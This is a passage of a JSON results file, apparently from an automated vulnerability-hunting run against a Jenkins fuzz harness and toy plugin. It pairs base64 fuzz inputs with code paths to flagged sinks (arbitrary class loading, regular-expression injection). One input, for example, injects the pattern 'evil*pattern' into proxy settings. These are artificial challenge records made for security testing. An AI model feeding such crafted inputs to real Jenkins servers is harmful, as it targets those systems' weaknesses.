ExtensionList '%s' from\", extensionType.getName()), new Throwable(\"Only present for stacktrace information\"));\n382           }\n383   \n384           return Objects.requireNonNull(jenkins).getPluginManager().getPluginStrategy().findComponents(extensionType, hudson);\n385       }\n\nsrc/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java:\n321       @Override\n322       public <T> List<ExtensionComponent<T>> findComponents(Class<T> type, Hudson hudson) {\n323   \n324           List<ExtensionFinder> finders;\n325           if (type == ExtensionFinder.class) {\n326               // Avoid infinite recursion of using ExtensionFinders to find ExtensionFinders\n327               finders = List.of(new ExtensionFinder.Sezpoz());\n328           } else {\n329               finders = hudson.getExtensionList(ExtensionFinder.class);\n330           }\n331   \n332           /*\n333            * See ExtensionFinder#scout(Class, Hudson) for the dead lock issue and what this does.\n334            */\n335           if (LOGGER.isLoggable(Level.FINER))\n336               LOGGER.log(Level.FINER, \"Scout-loading ExtensionList: \" + type, new Throwable());\n337           for (ExtensionFinder finder : finders) {\n338               finder.scout(type, hudson);\n339           }\n340   \n341           List<ExtensionComponent<T>> r = new ArrayList<>();\n342           for (ExtensionFinder finder : finders) {\n343               try {\n344                   r.addAll(finder.find(type, hudson));\n345               } catch (AbstractMethodError e) {\n346                   // backward compatibility\n347                   for (T t : finder.findExtensions(type, hudson))\n348                       r.add(new ExtensionComponent<>(t));\n349               }\n350           }\n351   \n352           List<ExtensionComponent<T>> filtered = new ArrayList<>();\n353           for (ExtensionComponent<T> e : r) {\n354               if (ExtensionFilter.isAllowed(type, e))\n355                   filtered.add(e);\n356           }\n357   \n358           return filtered;\n359       }\n\nsrc/jenkins/core/src/main/java/hudson/cli/declarative/CLIRegisterer.java:\n 81       @Override\n 82       public <T> Collection<ExtensionComponent<T>> find(Class<T> type, Hudson jenkins) {\n 83           if (type == CLICommand.class)\n 84               return (List) discover(jenkins);\n 85           else\n 86               return Collections.emptyList();\n 87       }\n101       private List<ExtensionComponent<CLICommand>> discover(@NonNull final Jenkins jenkins) {\n102           LOGGER.fine(\"Listing up @CLIMethod\");\n103           List<ExtensionComponent<CLICommand>> r = new ArrayList<>();\n104   \n105           try {\n106               for (final Method m : Util.filter(Index.list(CLIMethod.class, jenkins.getPluginManager().uberClassLoader), Method.class)) {\n107                   try {\n108                       // command name\n109                       final String name = m.getAnnotation(CLIMethod.class).name();\n110   \n111                       final ResourceBundleHolder res = loadMessageBundle(m);\n112                       res.format(\"CLI.\" + name + \".shortDescription\");   // make sure we have the resource, to fail early\n113   \n114                       r.add(new ExtensionComponent<>(new CloneableCLICommand() {\n115                           @Override\n116                           public String getName() {\n117                               return name;\n118                           }\n119   \n120                           @Override\n121                           public String getShortDescription() {\n122                               // format by using the right locale\n123                               return res.format(\"CLI.\" + name + \".shortDescription\");\n124                           }\n125   \n126                           @Override\n127                           protected CmdLineParser getCmdLineParser() {\n128                               return bindMethod(new ArrayList<>());\n129                           }\n130   \n131                           private CmdLineParser bindMethod(List<MethodBinder> binders) {\n132   \n133                               registerOptionHandlers();\n134                               CmdLineParser parser = new CmdLineParser(null);\n135   \n136                               //  build up the call sequence\n137                               Stack<Method> chains = new Stack<>();\n138                               Method method = m;\n139                               while (true) {\n140                                   chains.push(method);\n141                                   if (Modifier.isStatic(method.getModifiers()))\n142                                       break; // the chain is complete.\n143   \n144                                   // the method in question is an instance method, so we need to resolve the instance by using another resolver\n145                                   Class<?> type = method.getDeclaringClass();\n146                                   try {\n147                                       method = findResolver(type);\n148                                   } catch (IOException ex) {\n149                                       throw new RuntimeException(\"Unable to find the resolver method annotated with @CLIResolver for \" + type, ex);\n150                                   }\n151                                   if (method == null) {\n152                                       throw new RuntimeException(\"Unable to find the resolver method annotated with @CLIResolver for \" + type);\n153                                   }\n154                               }\n155   \n156                               while (!chains.isEmpty())\n157                                   binders.add(new MethodBinder(chains.pop(), this, parser));\n158   \n159                               return parser;\n160                           }\n161   \n162                           /**\n163                            * Envelope an annotated CLI command\n164                            *\n165                            * @param args\n166                            *      Arguments to the sub command. For example, if the CLI is invoked like \"java -jar cli.jar foo bar zot\",\n167                            *      then \"foo\" is the sub-command and the argument list is [\"bar\",\"zot\"].\n168                            * @param locale\n169                            *      Locale of the client (which can be different from that of the server.) Good behaving command implementation\n170                            *      would use this locale for formatting messages.\n171                            * @param stdin\n172                            *      Connected to the stdin of the CLI client.\n173                            * @param stdout\n174                            *      Connected to the stdout of the CLI client.\n175                            * @param stderr\n176                            *      Connected to the stderr of the CLI client.\n177                            * @return\n178                            *      Exit code from the CLI command execution\n179                            *\n180                            *      <p>\n181                            *      Jenkins standard exit codes from CLI:\n182                            *      0 means everything went well.\n183                            *      1 means further unspecified exception is thrown while performing the command.\n184                            *      2 means CmdLineException is thrown while performing the command.\n185                            *      3 means IllegalArgumentException is thrown while performing the command.\n186                            *      4 mean IllegalStateException is thrown while performing the command.\n187                            *      5 means AbortException is thrown while performing the command.\n188                            *      6 means AccessDeniedException is thrown while performing the command.\n189                            *      7 means BadCredentialsException is thrown while performing the command.\n190                            *      8-15 are reserved for future usage\n191                            *      16+ mean a custom CLI exit error code (meaning defined by the CLI command itself)\n192                            *\n193                            *      <p>\n194                            *      Note: For details - see JENKINS-32273\n195                            */\n196                           @Override\n197                           public int main(List<String> args, Locale locale, InputStream stdin, PrintStream stdout, PrintStream stderr) {\n198                               this.stdout = stdout;\n199                               this.stderr = stderr;\n200                               this.locale = locale;\n201   \n202                               List<MethodBinder> binders = new ArrayList<>();\n203   \n204                               CmdLineParser parser = bindMethod(binders);\n205                               try {\n206                                   // TODO this could probably use ACL.as; why is it calling SecurityContext.setAuthentication rather than SecurityContextHolder.setContext?\n207                                   SecurityContext sc = SecurityContextHolder.getContext();\n208                                   Authentication old = sc.getAuthentication();\n209                                   try {\n210                                       // fill up all the binders\n211                                       parser.parseArgument(args);\n212   \n213                                       Authentication auth = getTransportAuthentication2();\n214                                       sc.setAuthentication(auth); // run the CLI with the right credential\n215                                       jenkins.checkPermission(Jenkins.READ);\n216   \n217                                       // resolve them\n218                                       Object instance = null;\n219                                       for (MethodBinder binder : binders)\n220                                           instance = binder.call(instance);\n221   \n222                                       if (instance instanceof Integer)\n223                                           return (Integer) instance;\n224                                       else\n225                                           return 0;\n226                                   } catch (InvocationTargetException e) {\n227                                       Throwable t = e.getTargetException();\n228                                       if (t instanceof Exception)\n229                                           throw (Exception) t;\n230                                       throw e;\n231                                   } finally {\n232                                       sc.setAuthentication(old); // restore\n233                                   }\n234                               } catch (CmdLineException e) {\n235                                   printError(e.getMessage());\n236                                   printUsage(stderr, parser);\n237                                   return 2;\n238                               } catch (IllegalStateException e) {\n239                                   printError(e.getMessage());\n240                                   return 4;\n241                               } catch (IllegalArgumentException e) {\n242                                   printError(e.getMessage());\n243                                   return 3;\n244                               } catch (AbortException e) {\n245                                   printError(e.getMessage());\n246                                   return 5;\n247                               } catch (AccessDeniedException e) {\n248                                   printError(e.getMessage());\n249                                   return 6;\n250                               } catch (BadCredentialsException e) {\n251                                   // to the caller, we can't reveal whether the user didn't exist or the password didn't match.\n252                                   // do that to the server log instead\n253                                   String id = UUID.randomUUID().toString();\n254                                   logAndPrintError(e, \"Bad Credentials. Search the server log for \" + id + \" for more details.\",\n255                                           \"CLI login attempt failed: \" + id, Level.INFO);\n256                                   return 7;\n257                               } catch (Throwable e) {\n258                                   final String errorMsg = \"Unexpected exception occurred while performing \" + getName() + \" command.\";\n259                                   logAndPrintError(e, errorMsg, errorMsg, Level.WARNING);\n260                                   Functions.printStackTrace(e, stderr);\n261                                   return 1;\n262                               }\n263                           }\n264   \n265                           private void printError(String errorMessage) {\n266                               this.stderr.println();\n267                               this.stderr.println(\"ERROR: \" + errorMessage);\n268                           }\n269   \n270                           private void logAndPrintError(Throwable e, String errorMessage, String logMessage, Level logLevel) {\n271                               LOGGER.log(logLevel, logMessage, e);\n272                               printError(errorMessage);\n273                           }\n274   \n275                           @Override\n276                           protected int run() throws Exception {\n277                               throw new UnsupportedOperationException();\n278                           }\n279                       }));\n280                   } catch (ClassNotFoundException | MissingResourceException e) {\n281                       LOGGER.log(SEVERE, \"Failed to process @CLIMethod: \" + m, e);\n282                   }\n283               }\n284           } catch (IOException e) {\n285               LOGGER.log(SEVERE, \"Failed to discover @CLIMethod\", e);\n286           }\n287   \n288           return r;\n289       }\n294       private ResourceBundleHolder loadMessageBundle(Method m) throws ClassNotFoundException {\n295           Class c = m.getDeclaringClass();\n296           Class<?> msg = c.getClassLoader().loadClass(c.getName().substring(0, c.getName().lastIndexOf(\".\")) + \".Messages\");\n297           return ResourceBundleHolder.get(msg);\n298       }\n",
            "cost": 0.112235,
            "harness_id": "id_3",
            "sanitizer": "load arbitrary library",
            "sink": "src/jenkins/core/src/main/java/hudson/cli/declarative/CLIRegisterer.java:296:53",
            "status": "corpus",
            "valid_path": "NO",
            "id": 20
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n252       void testApi(ByteBuffer buf) {\n253           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n254           if (parts.length != 3) {\n255               return;\n256           }\n257   \n258           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n259           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n260           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n261           try {\n262               new Api(jenkins).doXml(req, rsp, parts[2], null, null, 0);\n263           } catch (IOException | ServletException e) {}\n264       }\n\nsrc/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Api.java:\n100       public void doXml(StaplerRequest req, StaplerResponse rsp,\n101                         @QueryParameter String xpath,\n102                         @QueryParameter String wrapper,\n103                         @QueryParameter String tree,\n104                         @QueryParameter int depth) throws IOException, ServletException {\n105           setHeaders(rsp);\n106   \n107           String[] excludes = req.getParameterValues(\"exclude\");\n108   \n109           if (xpath == null && excludes == null) {\n110               // serve the whole thing\n111               rsp.serveExposedBean(req, bean, Flavor.XML);\n112               return;\n113           }\n114   \n115           StringWriter sw = new StringWriter();\n116   \n117           // first write to String\n118           Model p = MODEL_BUILDER.get(bean.getClass());\n119           TreePruner pruner = tree != null ? new NamedPathPruner(tree) : new ByDepth(1 - depth);\n120           p.writeTo(bean, pruner, Flavor.XML.createDataWriter(bean, sw));\n121   \n122           // apply XPath\n123           Object result;\n124           try {\n125               Document dom = XMLUtils.parse(new StringReader(sw.toString()));\n126               // apply exclusions\n127               if (excludes != null) {\n128                   for (String exclude : excludes) {\n129                       XMLUtils.getValue(exclude, dom);\n130                   }\n131               }\n132   \n133               if (xpath == null) {\n134                   result = dom;\n135               } else {\n136                   List<String> list = new ArrayList<String>();\n137                   list.add(XMLUtils.getValue(xpath, dom));\n138                   if (wrapper != null) {\n139                       // check if the wrapper is a valid entity name\n140                       // First position:  letter or underscore\n141                       // Other positions: \\w (letter, number, underscore), dash or dot\n142                       String validNameRE = \"^[a-zA-Z_][\\\\w-\\\\.]*$\";\n143   \n144                       if (!wrapper.matches(validNameRE)) {\n145                           rsp.setStatus(HttpServletResponse.SC_BAD_REQUEST);\n146                           rsp.getWriter().print(\"Messages.Api_WrapperParamInvalid()\");\n147                           return;\n148                       }\n149   \n150                       Element root = DocumentFactory.getInstance().createElement(wrapper);\n151                       for (Object o : list) {\n152                           if (o instanceof String) {\n153                               root.addText(o.toString());\n154                           } else {\n155                               root.add(((org.dom4j.Node) o).detach());\n156                           }\n157                       }\n158                       result = root;\n159                   } else if (list.isEmpty()) {\n160                       rsp.setStatus(HttpServletResponse.SC_NOT_FOUND);\n161                       rsp.getWriter().print(\"Messages.Api_NoXPathMatch(xpath)\");\n162                       return;\n163                   } else if (list.size() > 1) {\n164                       rsp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n165                       rsp.getWriter().print(\"Messages.Api_MultipleMatch(xpath, list.size())\");\n166                       return;\n167                   } else {\n168                       result = list.get(0);\n169                   }\n170               }\n171   \n172           } catch (IOException | SAXException | XPathExpressionException e) {\n173               LOGGER.log(Level.FINER, \"Failed to do XPath/wrapper handling. XML is as follows:\" + sw, e);\n174               throw new IOException(\"Failed to do XPath/wrapper handling. Turn on FINER logging to view XML.\", e);\n175           }\n176   \n177   \n178           if (isSimpleOutput(result) && !permit(req)) {\n179               // simple output prohibited\n180               rsp.sendError(HttpURLConnection.HTTP_FORBIDDEN, \"primitive XPath result sets forbidden; implement jenkins.security.SecureRequester\");\n181               return;\n182           }\n183   \n184           // switch to gzipped output\n185           try (OutputStream o = rsp.getCompressedOutputStream(req)) {\n186               if (isSimpleOutput(result)) {\n187                   // simple output allowed\n188                   rsp.setContentType(\"text/plain;charset=UTF-8\");\n189                   String text = result instanceof CharacterData ? ((CharacterData) result).getText() : result.toString();\n190                   o.write(text.getBytes(StandardCharsets.UTF_8));\n191                   return;\n192               }\n193   \n194               // otherwise XML\n195               rsp.setContentType(\"application/xml;charset=UTF-8\");\n196               new XMLWriter(o).write(result);\n197           }\n198       }\n235       private boolean permit(StaplerRequest req) {\n236           for (SecureRequester r : ExtensionList.lookup(SecureRequester.class)) {\n237               if (r.permit(req, bean)) {\n238                   return true;\n239               }\n240           }\n241           return false;\n242       }\n\nsrc/jenkins/core/src/main/java/hudson/ExtensionList.java:\n169       @Override\n170       public @NonNull Iterator<T> iterator() {\n171           // we need to intercept mutation, so for now don't allow Iterator.remove\n172           return new AdaptedIterator<>(Iterators.readOnly(ensureLoaded().iterator())) {\n173               @Override\n174               protected T adapt(ExtensionComponent<T> item) {\n175                   return item.getInstance();\n176               }\n177           };\n178       }\n312       private List<ExtensionComponent<T>> ensureLoaded() {\n313           if (extensions != null)\n314               return extensions; // already loaded\n315           if (jenkins == null || jenkins.getInitLevel().compareTo(InitMilestone.PLUGINS_PREPARED) < 0)\n316               return legacyInstances; // can't perform the auto discovery until all plugins are loaded, so just make the legacy instances visible\n317   \n318           synchronized (getLoadLock()) {\n319               if (extensions == null) {\n320                   List<ExtensionComponent<T>> r = load();\n321                   r.addAll(legacyInstances);\n322                   extensions = sort(r);\n323               }\n324               return extensions;\n325           }\n326       }\n378       protected List<ExtensionComponent<T>> load() {\n379           LOGGER.fine(() -> String.format(\"Loading ExtensionList '%s'\", extensionType.getName()));\n380           if (LOGGER.isLoggable(Level.FINER)) {\n381               LOGGER.log(Level.FINER, String.format(\"Loading ExtensionList '%s' from\", extensionType.getName()), new Throwable(\"Only present for stacktrace information\"));\n382           }\n383   \n384           return Objects.requireNonNull(jenkins).getPluginManager().getPluginStrategy().findComponents(extensionType, hudson);\n385       }\n\nsrc/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java:\n321       @Override\n322       public <T> List<ExtensionComponent<T>> findComponents(Class<T> type, Hudson hudson) {\n323   \n324           List<ExtensionFinder> finders;\n325           if (type == ExtensionFinder.class) {\n326               // Avoid infinite recursion of using ExtensionFinders to find ExtensionFinders\n327               finders = List.of(new ExtensionFinder.Sezpoz());\n328           } else {\n329               finders = hudson.getExtensionList(ExtensionFinder.class);\n330           }\n331   \n332           /*\n333            * See ExtensionFinder#scout(Class, Hudson) for the dead lock issue and what this does.\n334            */\n335           if (LOGGER.isLoggable(Level.FINER))\n336               LOGGER.log(Level.FINER, \"Scout-loading ExtensionList: \" + type, new Throwable());\n337           for (ExtensionFinder finder : finders) {\n338               finder.scout(type, hudson);\n339           }\n340   \n341           List<ExtensionComponent<T>> r = new ArrayList<>();\n342           for (ExtensionFinder finder : finders) {\n343               try {\n344                   r.addAll(finder.find(type, hudson));\n345               } catch (AbstractMethodError e) {\n346                   // backward compatibility\n347                   for (T t : finder.findExtensions(type, hudson))\n348                       r.add(new ExtensionComponent<>(t));\n349               }\n350           }\n351   \n352           List<ExtensionComponent<T>> filtered = new ArrayList<>();\n353           for (ExtensionComponent<T> e : r) {\n354               if (ExtensionFilter.isAllowed(type, e))\n355                   filtered.add(e);\n356           }\n357   \n358           return filtered;\n359       }\n\nsrc/jenkins/core/src/main/java/hudson/ExtensionFinder.java:\n762           @Override\n763           public void scout(Class extensionType, Hudson hudson) {\n764               for (IndexItem<Extension, Object> item : getIndices()) {\n765                   try {\n766                       // we might end up having multiple threads concurrently calling into element(),\n767                       // but we can't synchronize this --- if we do, the one thread that's supposed to load a class\n768                       // can block while other threads wait for the entry into the element call().\n769                       // looking at the sezpoz code, it should be safe to do so\n770                       Class<?> extType = getClassFromIndex(item);\n771                       // according to JDK-4993813 this is the only way to force class initialization\n772                       Class.forName(extType.getName(), true, extType.getClassLoader());\n773                   } catch (Exception | LinkageError e) {\n774                       LOGGER.log(logLevel(item), \"Failed to scout \" + item.className(), e);\n775                   }\n776               }\n777           }\n",
            "cost": 0.079955,
            "harness_id": "id_3",
            "sanitizer": "load arbitrary library",
            "sink": "src/jenkins/core/src/main/java/hudson/ExtensionFinder.java:772:35",
            "status": "corpus",
            "valid_path": "IDK",
            "id": 21
        },
        {
            "blob": [
                "AAAAC25hbWUAdGVzdF9uYW1lAHBvcnQAODA4MABub3Byb3h5aG9zdAAq"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 60       public static void fuzzerInitialize() throws Throwable {\n 61           jenkins = Mockito.mock(Jenkins.class);\n 62   \n 63           replacer = new StaplerReplacer();\n 64           replacer.setWebApp(new WebApp(Mockito.mock(ServletContext.class)));\n 65   \n 66           rsp = Mockito.mock(ResponseImpl.class);\n 67           StringWriter sw = new StringWriter();\n 68           PrintWriter pw = new PrintWriter(sw);\n 69           when(rsp.getWriter()).thenReturn(pw);\n 70   \n 71           secretMessage = new SecretMessage();\n 72           manager = PluginManager.createDefault(jenkins);\n 73       }\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n126       void testProxyConfiguration(ByteBuffer buf) throws Exception {\n127           Authentication a = Mockito.mock(Authentication.class);\n128           when(a.getName()).thenReturn(\"mock\");\n129   \n130           Jenkins j = Mockito.mock(Jenkins.class);\n131           doThrow(new AccessDeniedException3(a, Jenkins.ADMINISTER))\n132               .when(j)\n133               .checkPermission(Jenkins.ADMINISTER);\n134   \n135           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n136           if (parts.length != 5) {\n137               return;\n138           }\n139   \n140           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n141           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n142           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n143           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n144           try {\n145               new ProxyConfiguration.DescriptorImpl2(j).doValidateProxy(parts[4], req, rsp);\n146           } catch (AccessDeniedException3 | InterruptedException e) {}\n147       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/jenkins/core/src/main/java/hudson/ProxyConfiguration.java:\n222       public static List<Pattern> getNoProxyHostPatterns(String noProxyHost) {\n223           if (noProxyHost == null)  return Collections.emptyList();\n224   \n225           List<Pattern> r = new ArrayList<>();\n226           for (String s : noProxyHost.split(\"[ \\t\\n,|]+\")) {\n227               if (s.isEmpty())  continue;\n228               r.add(Pattern.compile(s.replace(\".\", \"\\\\.\").replace(\"*\", \".*\")));\n229           }\n230           return r;\n231       }\n527           @RequirePOST\n528           @Restricted(NoExternalUse.class)\n529           public FormValidation doValidateProxy(\n530               @QueryParameter(\"testUrl\") String testUrl,\n531               StaplerRequest request,\n532               StaplerResponse response) throws InterruptedException {\n533   \n534               testUrl = Util.fixEmptyAndTrim(testUrl);\n535               if (testUrl == null) {\n536                   return FormValidation.error(Messages.ProxyConfiguration_TestUrlRequired());\n537               }\n538               URI uri;\n539               try {\n540                   uri = new URI(testUrl);\n541               } catch (URISyntaxException e) {\n542                   return FormValidation.error(e, Messages.ProxyConfiguration_MalformedTestUrl(testUrl));\n543               }\n544               HttpClient.Builder builder = HttpClient.newBuilder();\n545               builder.connectTimeout(DEFAULT_CONNECT_TIMEOUT_MILLIS > 0\n546                       ? Duration.ofMillis(DEFAULT_CONNECT_TIMEOUT_MILLIS)\n547                       : Duration.ofSeconds(30));\n548   \n549               if (!request.hasParameter(\"name\")) {\n550                   return FormValidation.error(\"Missing parameter [name]\");\n551               }\n552   \n553               if (!request.hasParameter(\"port\")) {\n554                   return FormValidation.error(\"Missing parameter [port]\");\n555               }\n556   \n557               String name = request.getParameter(\"name\");\n558               int port = -1;\n559               try {\n560                   port = Integer.parseInt(request.getParameter(\"port\"));\n561               } catch (NumberFormatException e) {\n562                   return FormValidation.error(\"Invalid value for parameter [port]\");\n563               }\n564   \n565               String noProxyHost = null;\n566               if (request.hasParameter(\"noproxyhost\")) {\n567                   noProxyHost = request.getParameter(\"noproxyhost\");\n568               }\n569   \n570               String userName = null;\n571               if (request.hasParameter(\"username\")) {\n572                   userName = request.getParameter(\"username\");\n573               }\n574   \n575               Secret password = null;\n576   \n577               if (Util.fixEmptyAndTrim(name) != null &&\n578                   !isNoProxyHost(uri.getHost(), noProxyHost)) {\n579                   builder.proxy(ProxySelector.of(new InetSocketAddress(name, port)));\n580                   Authenticator authenticator = newValidationAuthenticator(userName, password != null ? password.getPlainText() : null);\n581                   builder.authenticator(authenticator);\n582               }\n583               HttpClient httpClient = builder.build();\n584               HttpRequest httpRequest;\n585               try {\n586                   httpRequest = ProxyConfiguration.newHttpRequestBuilder(uri)\n587                           .method(\"HEAD\", HttpRequest.BodyPublishers.noBody())\n588                           .build();\n589               } catch (IllegalArgumentException e) {\n590                   return FormValidation.error(e, Messages.ProxyConfiguration_MalformedTestUrl(testUrl));\n591               }\n592               try {\n593                   HttpResponse<Void> httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.discarding());\n594                   if (httpResponse.statusCode() == HttpURLConnection.HTTP_OK) {\n595                       return FormValidation.ok(Messages.ProxyConfiguration_Success());\n596                   }\n597                   return FormValidation.error(Messages.ProxyConfiguration_FailedToConnect(testUrl, httpResponse.statusCode()));\n598               } catch (IOException e) {\n599                   return FormValidation.error(e, Messages.ProxyConfiguration_FailedToConnectViaProxy(testUrl));\n600               }\n601           }\n603           private boolean isNoProxyHost(String host, String noProxyHost) {\n604               if (host != null && noProxyHost != null) {\n605                   for (Pattern p : getNoProxyHostPatterns(noProxyHost)) {\n606                       if (p.matcher(host).matches()) {\n607                           return true;\n608                       }\n609                   }\n610               }\n611               return false;\n612           }\n",
            "cost": 0.4554400000000002,
            "harness_id": "id_3",
            "sanitizer": "Regular Expression Injection",
            "sink": "src/jenkins/core/src/main/java/hudson/ProxyConfiguration.java:226:43",
            "status": "corpus",
            "valid_path": "YES",
            "id": 22
        },
        {
            "blob": [
                "AAAAC25hbWUAcHJveHlOYW1lAHBvcnQAODA4MABub3Byb3h5aG9zdABldmlsKnBhdHRlcm4="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-three/src/main/java/com/aixcc/jenkins/harnesses/three/JenkinsThree.java:\n 60       public static void fuzzerInitialize() throws Throwable {\n 61           jenkins = Mockito.mock(Jenkins.class);\n 62   \n 63           replacer = new StaplerReplacer();\n 64           replacer.setWebApp(new WebApp(Mockito.mock(ServletContext.class)));\n 65   \n 66           rsp = Mockito.mock(ResponseImpl.class);\n 67           StringWriter sw = new StringWriter();\n 68           PrintWriter pw = new PrintWriter(sw);\n 69           when(rsp.getWriter()).thenReturn(pw);\n 70   \n 71           secretMessage = new SecretMessage();\n 72           manager = PluginManager.createDefault(jenkins);\n 73       }\n 75       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 76           new JenkinsThree().fuzz(data);\n 77       }\n 79       public void fuzz(byte[] data) throws Exception {\n 80           ByteBuffer buf = ByteBuffer.wrap(data);\n 81           if (buf.remaining() < 4) {\n 82               return;\n 83           }\n 84   \n 85           int picker = buf.getInt();\n 86           switch (picker) {\n 87               case 11:\n 88                   testProxyConfiguration(buf);\n 89                   break;\n 90               case 33:\n 91                   testPlugin(buf);\n 92                   break;\n 93               case 37:\n 94                   testScript(buf);\n 95                   break;\n 96               case 38:\n 97                   testStateMonitor(buf);\n 98                   break;\n 99               case 73:\n100                   testApi(buf);\n101                   break;\n102               case 77:\n103                   testAccessFilter(buf);\n104                   break;\n105               case 142:\n106                   testUserNameAction(buf);\n107                   break;\n108               case 144:\n109                   testRecoverCoverage(buf);\n110                   break;\n111               case 190:\n112                   testAuthAction(buf);\n113                   break;\n114               case 209:\n115                   testSecretMessage(buf);\n116                   break;\n117               case 249:\n118                   testUserRemoteConfig(buf);\n119                   break;\n120               default:\n121                   break;\n122           }\n123   \n124       }\n126       void testProxyConfiguration(ByteBuffer buf) throws Exception {\n127           Authentication a = Mockito.mock(Authentication.class);\n128           when(a.getName()).thenReturn(\"mock\");\n129   \n130           Jenkins j = Mockito.mock(Jenkins.class);\n131           doThrow(new AccessDeniedException3(a, Jenkins.ADMINISTER))\n132               .when(j)\n133               .checkPermission(Jenkins.ADMINISTER);\n134   \n135           String[] parts = getRemainingAsString(buf).split(\"\\0\");\n136           if (parts.length != 5) {\n137               return;\n138           }\n139   \n140           HttpServletRequest innerReq = Mockito.mock(HttpServletRequest.class);\n141           when(innerReq.getParameter(parts[0])).thenReturn(parts[1]);\n142           when(innerReq.getParameter(parts[2])).thenReturn(parts[3]);\n143           RequestImpl req = new RequestImpl(replacer.stapler, innerReq, Collections.emptyList(), null);\n144           try {\n145               new ProxyConfiguration.DescriptorImpl2(j).doValidateProxy(parts[4], req, rsp);\n146           } catch (AccessDeniedException3 | InterruptedException e) {}\n147       }\n358       String getRemainingAsString(ByteBuffer buf) {\n359           byte[] remainingBytes = new byte[buf.remaining()];\n360           buf.get(remainingBytes);\n361           return new String(remainingBytes);\n362       }\n\nsrc/jenkins/core/src/main/java/hudson/ProxyConfiguration.java:\n222       public static List<Pattern> getNoProxyHostPatterns(String noProxyHost) {\n223           if (noProxyHost == null)  return Collections.emptyList();\n224   \n225           List<Pattern> r = new ArrayList<>();\n226           for (String s : noProxyHost.split(\"[ \\t\\n,|]+\")) {\n227               if (s.isEmpty())  continue;\n228               r.add(Pattern.compile(s.replace(\".\", \"\\\\.\").replace(\"*\", \".*\")));\n229           }\n230           return r;\n231       }\n527           @RequirePOST\n528           @Restricted(NoExternalUse.class)\n529           public FormValidation doValidateProxy(\n530               @QueryParameter(\"testUrl\") String testUrl,\n531               StaplerRequest request,\n532               StaplerResponse response) throws InterruptedException {\n533   \n534               testUrl = Util.fixEmptyAndTrim(testUrl);\n535               if (testUrl == null) {\n536                   return FormValidation.error(Messages.ProxyConfiguration_TestUrlRequired());\n537               }\n538               URI uri;\n539               try {\n540                   uri = new URI(testUrl);\n541               } catch (URISyntaxException e) {\n542                   return FormValidation.error(e, Messages.ProxyConfiguration_MalformedTestUrl(testUrl));\n543               }\n544               HttpClient.Builder builder = HttpClient.newBuilder();\n545               builder.connectTimeout(DEFAULT_CONNECT_TIMEOUT_MILLIS > 0\n546                       ? Duration.ofMillis(DEFAULT_CONNECT_TIMEOUT_MILLIS)\n547                       : Duration.ofSeconds(30));\n548   \n549               if (!request.hasParameter(\"name\")) {\n550                   return FormValidation.error(\"Missing parameter [name]\");\n551               }\n552   \n553               if (!request.hasParameter(\"port\")) {\n554                   return FormValidation.error(\"Missing parameter [port]\");\n555               }\n556   \n557               String name = request.getParameter(\"name\");\n558               int port = -1;\n559               try {\n560                   port = Integer.parseInt(request.getParameter(\"port\"));\n561               } catch (NumberFormatException e) 